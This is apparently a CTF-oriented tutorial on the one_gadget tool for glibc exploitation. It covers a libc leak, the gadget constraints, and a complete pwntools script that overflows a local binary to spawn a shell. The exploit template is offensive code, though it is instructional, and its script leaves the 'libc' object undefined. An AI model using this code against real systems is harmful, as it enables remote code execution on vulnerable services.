# One-Gadget Lookup Guide

## What is one_gadget?

`one_gadget` is a tool that finds single ROP gadgets that spawn a shell directly in libc.
Instead of building a complex ROP chain, you leak a libc address and jump to a one-gadget.

**Installation:**
```bash
gem install one_gadget
# Or if using system ruby:
apt-get install ruby-dev && gem install one_gadget
```

## Usage

```bash
# Find gadgets in libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# Find gadgets for specific glibc version
one_gadget /path/to/libc-2.31.so
```

## Typical Workflow

1. **Leak libc address** from binary (via information disclosure)
   ```python
   # From pwn template
   # e.g., leak printf@GOT, get actual address
   libc_base = leaked_address - libc.symbols['printf']
   ```

2. **Run one_gadget on target libc**
   ```bash
   one_gadget /lib64/libc.so.6
   # Output:
   # 0xe6e73 execve("/bin/sh", rsp+0x30, environ)
   # constraints: [rax == NULL] || [rbx == NULL] || [rcx == NULL]
   # 0xe6e74 execve("/bin/sh", rsp+0x30, environ)
   # ...
   ```

3. **Check constraints** and adjust ROP chain if needed
   - Constraints show what registers must be NULL for gadget to work
   - Often need to insert `xor rax, rax` or similar before gadget

4. **Build exploit**
   ```python
   one_gadget_offset = 0xe6e73
   one_gadget_addr = libc_base + one_gadget_offset
   
   # Build ROP chain to call one_gadget
   payload = flat({
       offset: [one_gadget_addr]
   })
   ```

## Common Constraints

| Constraint | Solution |
|-----------|----------|
| `[rax == NULL]` | Add `xor rax, rax` gadget before calling one_gadget |
| `[rbx == NULL]` | Add `xor rbx, rbx` gadget before calling one_gadget |
| `[rcx == NULL]` | Add `xor rcx, rcx` gadget before calling one_gadget |
| `[rsp+0x30 == NULL]` | Adjust ROP chain, ensure stack layout meets conditions |

## Important Notes

- **one_gadget is libc-specific**: Different glibc versions have different gadgets
  - Always use the EXACT libc from target system
  - Use `ltrace` or leak techniques to determine libc version

- **Constraints must be satisfied**:
  - Most common: `[rax == NULL]` (insert `xor rax, rax; ret` before gadget)
  - Some require specific stack layout

- **No ASLR bypass needed**:
  - If you have a libc leak, one_gadget is instant shell
  - Very effective in CTF when information disclosure exists

## Quick Decision Tree

```
Does binary have info disclosure (leak)?
├─ YES → Can leak libc address
│  └─ Use one_gadget (fast!)
└─ NO → No libc leak available
   └─ Build traditional ROP chain
```

## Example: Real Exploit

```python
from pwn import *

exe = "./vuln"
elf = context.binary = ELF(exe, checksec=False)

io = process([exe])

# Step 1: Leak libc address
io.sendline(b'A' * 100)
response = io.recvline()
leaked_puts = u64(response[:8])

# Step 2: Calculate libc base
libc_base = leaked_puts - libc.symbols['puts']

# Step 3: Calculate one_gadget address
one_gadget_offset = 0xe6e73  # From: one_gadget /lib64/libc.so.6
one_gadget_addr = libc_base + one_gadget_offset

# Step 4: Build ROP chain
offset_to_rip = 56  # Found via cyclic

# Need to satisfy [rax == NULL] constraint
xor_rax_ret = libc_base + 0x0000000000047cf8  # xor rax, rax; ret

payload = flat({
    offset_to_rip: [
        xor_rax_ret,        # Clear rax
        one_gadget_addr     # Call one_gadget
    ]
})

io.sendline(payload)
io.interactive()
```

## Resources

- **Find gadgets in libc**: `one_gadget /lib64/libc.so.6`
- **Dump all gadgets**: `ropper --file /lib64/libc.so.6 --search 'xor rax'`
- **Verify constraints**: Always read one_gadget output carefully
- **Common offsets**: Many CTF challenges use libc 2.27-2.31 (Ubuntu 18.04-20.04)
